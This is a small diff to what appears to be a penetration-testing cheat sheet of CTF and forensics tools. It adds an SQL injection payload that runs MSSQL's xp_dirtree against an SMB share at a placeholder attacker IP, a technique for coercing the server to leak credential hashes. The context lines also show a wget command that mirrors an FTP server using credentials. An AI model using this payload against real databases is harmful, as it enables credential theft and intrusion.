@@ -38,6 +38,11 @@ zsteg,steghide,binwalk.strings,file,foremost
  Other tools
 readpst,mdb-shell,mdb-sql
 
+
+
+Reading smbshare from mssql service using xp_dirtree:
+;declare @q varchar(200);set @q="\;your_ip\test";exec master.dbo.xp_dirtree @q;--
+
  Techniques
 To download all files from ftp server:
 wget -m --no-passive ftp://username:password@x.x.x.x
